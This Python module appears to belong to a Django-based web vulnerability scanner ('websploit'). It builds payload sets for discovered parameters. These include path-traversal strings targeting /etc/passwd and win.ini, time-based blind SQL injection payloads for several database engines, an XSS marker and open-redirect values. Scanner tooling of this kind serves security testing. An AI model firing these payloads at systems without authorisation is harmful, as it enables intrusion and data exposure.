import os, django, subprocess,json
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "backend.websploit.settings")
django.setup()
from backend.core.models import *


def load_urls(domain):
    base_dir = f"/work/output/{domain}"
    os.makedirs(base_dir, exist_ok=True)
    urls_file = base_dir + "/urls.txt"

    urls = WebApplication.objects.filter(subdomain__domain__hostname=domain)

    with open(urls_file, 'w') as file:
        for i in urls:
            file.write(f"{i.url}\n")



def load_html_urls_to_set(url, logout=None):
    """
    Gets all the urls has content-type text/html and returns them in set.
    """

    web_app = WebApplication.objects.get(url=url)
    base_url = web_app.url.rstrip('/')

    routes = EndPoint.objects.filter(
        web_app=web_app,
        content_type__icontains='html'
    )

    req_paths = set()
    for route in routes:
        if route.path:
            if logout is not None:
                if logout not in route.path:
                    path = route.path if route.path.startswith('/') else f"/{route.path}"
                    req_paths.add(path)
            else:
                path = route.path if route.path.startswith('/') else f"/{route.path}"
                req_paths.add(path)

    result = set()

    for path in req_paths:
        result.add(f"{base_url}{path}")

    return result


def load_xss_parameters_to_set(url):
    web_app = WebApplication.objects.get(url=url)

    parameters = Parameter.objects.filter(endpoint__web_app=web_app)

    result = set()

    for p in parameters:
        result.add(f'{p.key}="websploit"')

    return result


def load_path_traversal_parameters_to_set(url):
    web_app = WebApplication.objects.get(url=url)

    parameters = Parameter.objects.filter(endpoint__web_app=web_app)

    result = set()

    for p in parameters:
        result.add(f'{p.key}=/etc/passwd')
        result.add(f'{p.key}=../../../../../../../../../etc/passwd')
        result.add(f'{p.key}=\\Windows\\win.ini')
        result.add(f'{p.key}=..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini')

    return result


def load_sqli_parameters_to_set(url):
    web_app = WebApplication.objects.get(url=url)

    parameters = Parameter.objects.filter(endpoint__web_app=web_app)

    result = set()

    for p in parameters:
        result.add(f"{p.key}=web_sploit'")
        result.add(f"{p.key}=web_sploit'+AND+IF((SELECT+1)%3d1,+SLEEP(10),+0)+--+")
        result.add(f"{p.key}=web_sploit'%3b+SELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+--+")
        result.add(f"{p.key}=web_sploit'%3b+IF+(1%3d1)+WAITFOR+DELAY+'0%3a0%3a10'+--+")
        result.add(f"{p.key}=web_sploit'+AND+1%3d(SELECT+CASE+WHEN+(1%3d1)+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+0+END+FROM+dual)+--+")

    return result


def load_open_redirect_parameters_to_set(url):
    web_app = WebApplication.objects.get(url=url)

    parameters = Parameter.objects.filter(endpoint__web_app=web_app)

    result = set()

    for p in parameters:
        result.add(f'{p.key}=https://www.google.com/')
        result.add(f'{p.key}=//www.google.com/')

    return result